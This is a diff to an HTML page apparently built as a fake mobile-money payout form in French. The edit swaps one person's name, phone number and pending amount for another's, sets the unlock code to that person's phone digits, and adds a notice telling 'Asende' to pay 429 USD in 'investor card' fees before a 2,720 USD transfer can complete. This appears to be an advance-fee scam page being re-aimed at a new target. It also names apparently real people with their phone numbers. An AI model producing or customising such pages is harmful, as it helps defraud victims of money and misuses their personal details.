@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="Bawa Jemima " disabled />
+        <input type="text" id="name" value="Asende Shabombo Martin" disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+225 05 95 33 61 88" disabled />
+        <input type="tel" id="phone" value="+243 09 78 265 076" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="317.000 FCFA  " disabled />
+        <input type="text" id="amount" value="2 720 USD" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,8 +202,8 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-         Action requise : Veillez payer les frais de carte d'investisseur afin de terminer le transfert.
-
+         Action requise : Cher Asende,
+Nous vous prions de bien vouloir régler les frais liés à la carte d’investisseur, indispensables pour finaliser le transfert. Le montant s’élève à 429 USD.
       </div>
     </form>
   </div>
@@ -213,7 +213,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "6188") {
+      if (code === "5076") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
